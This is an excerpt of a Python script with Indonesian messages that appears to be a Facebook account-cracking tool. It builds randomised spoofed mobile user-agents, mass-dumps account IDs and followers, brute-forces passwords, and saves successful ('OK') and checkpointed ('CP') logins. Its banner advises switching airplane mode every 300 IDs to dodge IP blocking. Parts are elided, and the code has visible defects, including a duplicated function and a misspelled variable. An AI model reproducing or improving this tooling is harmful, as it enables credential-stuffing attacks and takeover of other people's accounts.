...
for t in range(10000):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	yudz1=f'Mozilla/5.0 (Linux; Android 7.1.2{a}; Xiaomi 10 Pro Build/MBFMIEK){b}. AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117{c}.0.{d}.{e} Mobile Safari/537.36'
	yudz2=f'Mozilla/5.0 (Linux; Android 11{a}; Infinix X6816C Build/RP1A.201005.001; wv){b}. AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/320.0.0.34.118;]'
	yudz3=f'Mozilla/5.0 (Linux; Android 11{a}; Infinix X665 Build/RP1A.200720.011; wv){b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]'
	yudz4=f'Mozilla/5.0 (Linux; Android 10.0.1{a}; oppo6833 Build/RP1A.200720.011; wv){b}.016;  AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]'
	uaku2 = random.choice([yudz1,yudz2,yudz3,yudz4])
	ugen.append(uaku2)
...
def uaku():
	try:
		...
		ua=open('.bbnew.txt','r').read().splitlines()
###----------[  ANIMASI ]----------###
def yudz_ganteng(berlari):
        for bot in berlari + "\n":sys.stdout.write(bot);sys.stdout.flush();time.sleep(0.1) 
###----------[  ANIMASI - 2 ]----------###
def yudz_ganteng(berlari):
        for bot in berlari + "\n":sys.stdout.write(bot);sys.stdout.flush();time.sleep(0.01) 
yudz_ganteng(f'SELAMAT DATANG ABANG²KAKAK² SEMOGA ANDA PANJANG UMUR.') 
yudz_ganteng(f'SEBELUM CRACK DIMULAI JANGAN LUPA BERDOA')
yudz_ganteng(f'DIHARAPKAN JANGAN TERLALU SERING CRACK')
yudz_ganteng(f'KARNA BISA MENYEBAB KAN IP ANDA KESPAM')
yudz_ganteng(f'SEDANG LOGIN KEDALAM TOOLS HARAP TUNGGU....')
time.sleep(3)
#------------[ INDICATION ]---------------#
...
♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪
    __  __       _                                         _                 _      _                                       ♪
 |  \/  |     | |                                       | |               | |    | |.                                            ♪
 | \  / |_   _| |__   __ _ _ __ ___  _ __ ___   __ _  __| |______ __ _  __| | ___| |.               ♪
 | |\/| | | | | '_ \ / _` | '_ ` _ \| '_ ` _ \ / _` |/ _` |______/ _` |/ _` |/ _ \ |.                       ♪
 | |  | | |_| | | | | (_| | | | | | | | | | | | (_| | (_| |     | (_| | (_| |  __/ |.                                   ♪
 |_|  |_|\__,_|_| |_|\__,_|_| |_| |_|_| |_| |_|\__,_|\__,_|      \__,_|\__,_|\___|_|.                ♪
♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪
      GITHUB : PRIVATE
      FACEBOOK : YUDZ XD
      WHATSAAP : +628231********
...
def menu(my_name,my_id):
	...
	yudz_xd=(f'>> Your Idz : '+str(my_id))
	yudz_xd=(f'>> Your Ip  : {ip}')
	print('')
	...
	print('>> 5. Hasil Crack  ')
	print('>> 0. Keluar       ')
	_____yudz__ganteng_____ = input('\n>> Pilih : ')
	if _____yudz__ganteng_____ in ['1']:
		dump_massal()
	elif _____yudx__ganteng_____ in ['2']:
		dump_follower()
	elif _____yudz__ganteng_____ in ['3']:
		error()
	elif _____yudz__ganteng_____ in ['4']:
		crack_file()
	elif _____yudz__ganteng_____ in ['5']:
		result()
	elif _____yudz__ganteng_____ in ['0']:
...
def passwrd():
	...
	print('')
	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(ok))
	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cp))
	print(f'>> Mainkan Mode Pesawat Setiap {m}300{x} Idz\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{H}[adel-xd] {P}{b}{loop}{P}/{u}{len(id)}{P}/{P}{H}{ok}{P}/{P}{k}{cp}{x}/{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
